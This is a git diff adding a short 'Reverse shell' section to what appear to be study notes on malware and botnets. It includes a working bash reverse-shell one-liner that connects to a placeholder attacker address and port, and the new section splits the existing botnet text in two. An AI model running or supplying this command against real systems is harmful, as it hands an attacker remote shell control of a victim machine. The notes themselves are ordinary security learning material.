@@ -88,6 +88,35 @@ Malware that affects a lot of machines
 
 the botnet with more than 2000 IPs scans the internet for open SSH
 
+---------------
+
+### Reverse shell
+
+It's a session from the victim to the attacker, more convenient action to continue the attack
+
+Common commands : 
+
+bash -i >& /dev/tcp/10.10.10.10/1337 0>&1    \  it forces the victim to connect to 10.10.10.10:1337 and launch bash
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 It brute forces the systems
 
 <img width="1015" height="248" alt="image" src="https://github.com/user-attachments/assets/c3cdb231-5a5a-44ad-87bc-9c50d5f42f6d" />
